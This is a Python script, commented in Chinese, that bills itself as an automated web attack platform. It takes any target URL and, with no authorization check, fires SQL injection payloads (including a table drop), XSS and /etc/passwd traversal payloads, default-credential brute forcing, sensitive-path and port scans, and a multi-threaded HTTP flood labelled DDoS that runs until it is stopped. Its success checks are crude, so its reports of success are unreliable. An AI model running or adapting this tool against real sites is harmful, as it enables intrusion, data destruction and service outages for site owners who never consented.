#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
自动化Web攻击平台
集成多种Web攻击技术的统一平台
"""

import requests
import threading
import time
import random
import socket
import ssl
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import json
import base64
import hashlib

class AutomatedWebAttackPlatform:
    def __init__(self):
        self.target_url = ""
        self.attack_threads = []
        self.is_attacking = False
        self.attack_stats = {
            'requests_sent': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'start_time': None
        }
        
        # 用户代理池
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0"
        ]
        
        # SQL注入载荷
        self.sql_payloads = [
            "' OR '1'='1",
            "' UNION SELECT 1,2,3--",
            "'; DROP TABLE users--",
            "' OR 1=1--",
            "admin'--",
            "' OR SLEEP(5)--"
        ]
        
        # XSS载荷
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>"
        ]
        
        # 目录遍历载荷
        self.dir_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
    
    def show_banner(self):
        """显示平台横幅"""
        print("=" * 80)
        print("          🌐 自动化Web攻击平台")
        print("=" * 80)
        print("💡 功能特性:")
        print("  ✅ SQL注入攻击")
        print("  ✅ XSS跨站脚本攻击")
        print("  ✅ 目录遍历攻击")
        print("  ✅ 暴力破解攻击")
        print("  ✅ DDoS攻击")
        print("  ✅ 端口扫描")
        print("  ✅ 漏洞扫描")
        print("  ✅ 多线程并发")
        print("=" * 80)
    
    def sql_injection_attack(self, target_url):
        """SQL注入攻击"""
        print(f"[SQL注入] 攻击目标: {target_url}")
        
        # 常见注入点参数
        injection_points = ['id', 'user', 'username', 'password', 'email', 'search']
        
        for param in injection_points:
            for payload in self.sql_payloads:
                try:
                    # 构建注入URL
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                        'Connection': 'keep-alive'
                    }
                    
                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                    
                    # 检测SQL注入成功迹象
                    if any(keyword in response.text.lower() for keyword in ['mysql', 'sql', 'syntax', 'error', 'warning']):
                        print(f"✅ SQL注入成功! 参数: {param}, 载荷: {payload}")
                        self.attack_stats['successful_attacks'] += 1
                    
                    self.attack_stats['requests_sent'] += 1
                    
                except Exception as e:
                    self.attack_stats['failed_attacks'] += 1
    
    def xss_attack(self, target_url):
        """XSS跨站脚本攻击"""
        print(f"[XSS攻击] 攻击目标: {target_url}")
        
        xss_points = ['q', 'search', 'keyword', 'name', 'comment', 'message']
        
        for param in xss_points:
            for payload in self.xss_payloads:
                try:
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Referer': target_url
                    }
                    
                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                    
                    # 检测XSS成功迹象
                    if payload.lower().replace('<script>', '').replace('</script>', '') in response.text.lower():
                        print(f"✅ XSS攻击成功! 参数: {param}, 载荷: {payload}")
                        self.attack_stats['successful_attacks'] += 1
                    
                    self.attack_stats['requests_sent'] += 1
                    
                except Exception as e:
                    self.attack_stats['failed_attacks'] += 1
    
    def directory_traversal_attack(self, target_url):
        """目录遍历攻击"""
        print(f"[目录遍历] 攻击目标: {target_url}")
        
        traversal_points = ['file', 'path', 'page', 'include', 'load']
        
        for param in traversal_points:
            for payload in self.dir_traversal_payloads:
                try:
                    test_url = f"{target_url}?{param}={urllib.parse.quote(payload)}"
                    
                    headers = {
                        'User-Agent': random.choice(self.user_agents)
                    }
                    
                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                    
                    # 检测目录遍历成功迹象
                    if any(keyword in response.text for keyword in ['root:', 'admin:', 'password:']):
                        print(f"✅ 目录遍历成功! 参数: {param}, 载荷: {payload}")
                        self.attack_stats['successful_attacks'] += 1
                    
                    self.attack_stats['requests_sent'] += 1
                    
                except Exception as e:
                    self.attack_stats['failed_attacks'] += 1
    
    def brute_force_attack(self, target_url):
        """暴力破解攻击"""
        print(f"[暴力破解] 攻击目标: {target_url}")
        
        # 常见用户名密码组合
        common_credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('test', 'test'),
            ('user', 'user')
        ]
        
        for username, password in common_credentials:
            try:
                # 尝试表单登录
                login_data = {
                    'username': username,
                    'password': password,
                    'submit': 'Login'
                }
                
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Content-Type': 'application/x-www-form-urlencoded'
                }
                
                response = requests.post(target_url, data=login_data, headers=headers, timeout=10, verify=False)
                
                # 检测登录成功迹象
                if any(keyword in response.text.lower() for keyword in ['welcome', 'dashboard', 'success', 'logged in']):
                    print(f"✅ 暴力破解成功! 用户名: {username}, 密码: {password}")
                    self.attack_stats['successful_attacks'] += 1
                
                self.attack_stats['requests_sent'] += 1
                
            except Exception as e:
                self.attack_stats['failed_attacks'] += 1
    
    def ddos_attack(self, target_url, thread_count=50):
        """DDoS攻击"""
        print(f"[DDoS攻击] 启动{thread_count}个线程攻击: {target_url}")
        
        def attack_worker():
            while self.is_attacking:
                try:
                    headers = {
                        'User-Agent': random.choice(self.user_agents),
                        'Accept': '*/*',
                        'Connection': 'keep-alive'
                    }
                    
                    # 随机选择攻击方法
                    attack_type = random.choice(['get', 'post', 'head'])
                    
                    if attack_type == 'get':
                        requests.get(target_url, headers=headers, timeout=5, verify=False)
                    elif attack_type == 'post':
                        requests.post(target_url, data={'data': 'attack'}, headers=headers, timeout=5, verify=False)
                    else:
                        requests.head(target_url, headers=headers, timeout=5, verify=False)
                    
                    self.attack_stats['requests_sent'] += 1
                    
                except:
                    self.attack_stats['failed_attacks'] += 1
        
        # 启动攻击线程
        for i in range(thread_count):
            thread = threading.Thread(target=attack_worker)
            thread.daemon = True
            thread.start()
            self.attack_threads.append(thread)
    
    def port_scan(self, target_host):
        """端口扫描"""
        print(f"[端口扫描] 扫描目标: {target_host}")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 8080, 8443]
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((target_host, port))
                sock.close()
                
                if result == 0:
                    print(f"✅ 端口 {port}: 开放")
                    return port
                
            except:
                pass
            return None
        
        # 使用线程池加速扫描
        with ThreadPoolExecutor(max_workers=20) as executor:
            results = executor.map(scan_port, common_ports)
            open_ports = [port for port in results if port is not None]
        
        print(f"📊 扫描完成: {len(open_ports)}个端口开放")
        return open_ports
    
    def vulnerability_scan(self, target_url):
        """漏洞扫描"""
        print(f"[漏洞扫描] 扫描目标: {target_url}")
        
        # 常见漏洞路径
        vulnerability_paths = [
            '/admin/', '/phpmyadmin/', '/wp-admin/', '/backup/',
            '/.git/', '/.svn/', '/.env', '/config.php',
            '/robots.txt', '/sitemap.xml', '/crossdomain.xml'
        ]
        
        vulnerabilities_found = []
        
        for path in vulnerability_paths:
            try:
                test_url = target_url.rstrip('/') + path
                response = requests.get(test_url, timeout=10, verify=False)
                
                if response.status_code == 200:
                    print(f"✅ 发现漏洞路径: {path}")
                    vulnerabilities_found.append(path)
                
            except:
                pass
        
        print(f"📊 漏洞扫描完成: 发现{len(vulnerabilities_found)}个潜在漏洞")
        return vulnerabilities_found
    
    def show_stats(self):
        """显示攻击统计"""
        if self.attack_stats['start_time']:
            elapsed_time = time.time() - self.attack_stats['start_time']
            requests_per_second = self.attack_stats['requests_sent'] / elapsed_time if elapsed_time > 0 else 0
            
            print("\n" + "=" * 80)
            print("          📊 攻击统计")
            print("=" * 80)
            print(f"📡 总请求数: {self.attack_stats['requests_sent']}")
            print(f"✅ 成功攻击: {self.attack_stats['successful_attacks']}")
            print(f"❌ 失败攻击: {self.attack_stats['failed_attacks']}")
            print(f"⏱️  运行时间: {elapsed_time:.1f}秒")
            print(f"🚀 请求速率: {requests_per_second:.1f} 请求/秒")
            print("=" * 80)
    
    def start_comprehensive_attack(self, target_url):
        """启动综合攻击"""
        self.target_url = target_url
        self.is_attacking = True
        self.attack_stats['start_time'] = time.time()
        
        print(f"🚀 开始综合攻击: {target_url}")
        
        # 提取主机名用于端口扫描
        target_host = urllib.parse.urlparse(target_url).netloc
        
        # 并行执行各种攻击
        attack_methods = [
            lambda: self.sql_injection_attack(target_url),
            lambda: self.xss_attack(target_url),
            lambda: self.directory_traversal_attack(target_url),
            lambda: self.brute_force_attack(target_url),
            lambda: self.vulnerability_scan(target_url),
            lambda: self.port_scan(target_host)
        ]
        
        # 启动扫描攻击
        with ThreadPoolExecutor(max_workers=6) as executor:
            executor.map(lambda f: f(), attack_methods)
        
        # 启动DDoS攻击
        self.ddos_attack(target_url)
        
        print("💡 所有攻击已启动，按Ctrl+C停止")
        
        # 显示实时统计
        try:
            while self.is_attacking:
                self.show_stats()
                time.sleep(5)
        except KeyboardInterrupt:
            self.stop_attack()
    
    def stop_attack(self):
        """停止攻击"""
        self.is_attacking = False
        print("\n🛑 停止所有攻击...")
        self.show_stats()

def main():
    """主函数"""
    platform = AutomatedWebAttackPlatform()
    platform.show_banner()
    
    # 获取目标URL
    target_url = input("🎯 请输入目标URL (例如: http://example.com): ")
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
    
    print(f"\n🎯 目标: {target_url}")
    print("💡 开始自动化Web攻击...")
    
    # 启动综合攻击
    platform.start_comprehensive_attack(target_url)

if __name__ == "__main__":
    main()